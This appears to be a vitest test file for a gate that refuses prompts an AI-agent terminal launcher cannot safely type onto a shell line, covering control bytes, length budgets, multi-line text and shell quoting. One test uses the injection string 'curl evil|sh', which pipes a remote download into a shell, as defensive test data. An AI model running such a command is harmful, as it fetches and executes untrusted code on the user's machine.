import { describe, expect, it } from 'vitest'
import {
  AGENT_PROMPT_NEEDS_PASTE_CODE,
  AgentPromptNeedsPasteError,
  TYPED_STARTUP_LINE_PROMPT_BUDGET_BYTES,
  typedLineRefusal
} from './agent-prompt-needs-paste'
import { buildAgentDraftLaunchPlan, buildAgentStartupPlan } from './tui-agent-startup'
import { TUI_AGENT_CONFIG } from './tui-agent-config'
import { ALL_TUI_AGENTS } from './tui-agent-display-names'
import type { TuiAgent } from './tui-agent'

// Each byte a line editor or the line discipline acts on: ^C, CR, ESC, ^U, ^W, ^D, DEL, NUL, TAB,
// and a C1 CSI a UTF-8 terminal may read as ESC [.
const REFUSED = ['\x03', '\r', '\x1b', '\x15', '\x17', '\x04', '\x7f', '\x00', '\t', '\u009b']

// Every agent whose prompt rides the typed launch line, one per injection mode at least.
const TYPED_AGENTS = ALL_TUI_AGENTS.filter((agent) =>
  ['argv', 'flag-prompt', 'flag-prompt-interactive', 'flag-interactive'].includes(
    TUI_AGENT_CONFIG[agent].promptInjectionMode
  )
)

function plan(agent: TuiAgent, prompt: string, extra: { typedLineMultiLine?: boolean } = {}) {
  return buildAgentStartupPlan({
    agent,
    prompt,
    cmdOverrides: {},
    platform: 'darwin',
    allowEmptyPromptLaunch: true,
    ...extra
  })
}

function refusalOf(run: () => unknown): string | null {
  try {
    run()
    return null
  } catch (error) {
    if (!(error instanceof AgentPromptNeedsPasteError)) {
      throw error
    }
    expect(error.message).toBe(AGENT_PROMPT_NEEDS_PASTE_CODE)
    return error.reason
  }
}

function firstAgent(test: (agent: TuiAgent) => boolean): TuiAgent {
  const agent = ALL_TUI_AGENTS.find(test)
  if (!agent) {
    throw new Error('no such agent in TUI_AGENT_CONFIG')
  }
  return agent
}

describe('the typed-line gate', () => {
  it('covers every typed injection mode', () => {
    const modes = new Set(TYPED_AGENTS.map((agent) => TUI_AGENT_CONFIG[agent].promptInjectionMode))
    expect([...modes].sort()).toEqual([
      'argv',
      'flag-interactive',
      'flag-prompt',
      'flag-prompt-interactive'
    ])
  })

  it.each(TYPED_AGENTS.flatMap((agent) => REFUSED.map((byte) => [agent, byte] as const)))(
    'refuses %s a prompt holding %j, with nothing built',
    (agent, byte) => {
      expect(refusalOf(() => plan(agent, `x${byte}curl evil|sh`))).toBe('control-byte')
    }
  )

  it.each(TYPED_AGENTS)('carries a plain prompt for %s', (agent) => {
    expect(plan(agent, 'explain this repo')?.launchCommand).toContain('explain this repo')
  })

  it('types a typical prompt byte for byte as before the gate', () => {
    const prompt = `Fix Bob's login bug in src\\auth — ąę 漢字 🙂, keep "tests" green (50% $HOME)`
    const posix = `'Fix Bob'"'"'s login bug in src'"\\\\"'auth — ąę 漢字 🙂, keep "tests" green (50% $HOME)'`
    expect(plan('claude', prompt)?.launchCommand).toBe(`claude ${posix}`)
    expect(plan('gemini', prompt)?.launchCommand).toBe(`gemini --prompt-interactive ${posix}`)
    expect(plan('copilot', prompt)?.launchCommand).toBe(`copilot -i ${posix}`)
    expect(plan('opencode', prompt)?.launchCommand).toBe(`opencode --prompt ${posix}`)
    expect(
      buildAgentStartupPlan({
        agent: 'claude',
        prompt,
        cmdOverrides: {},
        platform: 'win32',
        shell: 'powershell'
      })?.launchCommand
    ).toBe(
      `claude 'Fix Bob''s login bug in src\\auth — ąę 漢字 🙂, keep "tests" green (50% $HOME)'`
    )
  })

  it.each(TYPED_AGENTS)('refuses %s a line past the budget', (agent) => {
    const prompt = 'x'.repeat(TYPED_STARTUP_LINE_PROMPT_BUDGET_BYTES + 1)
    expect(refusalOf(() => plan(agent, prompt))).toBe('line-too-long')
  })

  it('refuses a multi-line prompt unless the caller checked the shell reads it whole', () => {
    expect(refusalOf(() => plan('claude', 'first\nsecond'))).toBe('multi-line')
    expect(plan('claude', 'first\nsecond', { typedLineMultiLine: true })?.launchCommand).toContain(
      'first\nsecond'
    )
    // Opted in, each line still has to fit, and control bytes stay refused.
    const long = `first\n${'x'.repeat(TYPED_STARTUP_LINE_PROMPT_BUDGET_BYTES + 1)}`
    expect(refusalOf(() => plan('claude', long, { typedLineMultiLine: true }))).toBe(
      'line-too-long'
    )
    expect(refusalOf(() => plan('claude', 'a\nb\x03c', { typedLineMultiLine: true }))).toBe(
      'control-byte'
    )
  })

  it('splits no quote: a prompt full of single quotes stays within one checked line', () => {
    // Each ' becomes '\'' on the line; the budget is measured after quoting.
    const prompt = "'".repeat(200)
    expect(refusalOf(() => plan('claude', prompt))).toBe('line-too-long')
  })

  it('reads the built line, so an escaped byte passes (PowerShell types `n for a newline)', () => {
    const built = buildAgentStartupPlan({
      agent: 'claude',
      prompt: 'first\nsecond',
      cmdOverrides: {},
      platform: 'win32'
    })
    expect(built?.launchCommand).toBe('claude "first`nsecond"')
    expect(
      refusalOf(() =>
        buildAgentStartupPlan({
          agent: 'claude',
          prompt: 'a\x03b',
          cmdOverrides: {},
          platform: 'win32'
        })
      )
    ).toBe('control-byte')
  })

  it('leaves prompts that never ride the typed line alone', () => {
    // stdin-after-start: the prompt is pasted into the agent once it holds the terminal.
    const stdinAgent = firstAgent(
      (agent) => TUI_AGENT_CONFIG[agent].promptInjectionMode === 'stdin-after-start'
    )
    expect(plan(stdinAgent, 'a\x03b')?.followupPrompt).toBe('a\x03b')
    // hermes: the prompt goes through the spawn env, the typed line is fixed.
    expect(plan('hermes', `a\x03b ${'x'.repeat(2000)}`)?.launchCommand).not.toContain('\x03')
  })

  it('sends a draft the line cannot carry to the paste after ready (null)', () => {
    const draftAgent = firstAgent((agent) => Boolean(TUI_AGENT_CONFIG[agent].draftPromptFlag))
    const draft = (text: string) =>
      buildAgentDraftLaunchPlan({
        agent: draftAgent,
        draft: text,
        cmdOverrides: {},
        platform: 'darwin'
      })
    expect(draft('plain draft')?.launchCommand).toContain('plain draft')
    for (const byte of REFUSED) {
      expect(draft(`x${byte}y`)).toBeNull()
    }
    expect(draft('a\nb')).toBeNull()
    expect(draft('x'.repeat(TYPED_STARTUP_LINE_PROMPT_BUDGET_BYTES + 1))).toBeNull()
  })

  it('names the refusal on the line itself', () => {
    expect(typedLineRefusal("claude 'ok'", { multiLine: false })).toBeNull()
    expect(typedLineRefusal("claude 'a\nb'", { multiLine: false })).toBe('multi-line')
    expect(typedLineRefusal("claude 'a\nb'", { multiLine: true })).toBeNull()
    expect(
      typedLineRefusal('x'.repeat(TYPED_STARTUP_LINE_PROMPT_BUDGET_BYTES), { multiLine: false })
    ).toBeNull()
    // Bytes, not UTF-16 units: 171 × € (3 bytes each) is 513.
    expect(typedLineRefusal('€'.repeat(171), { multiLine: false })).toBe('line-too-long')
  })
})
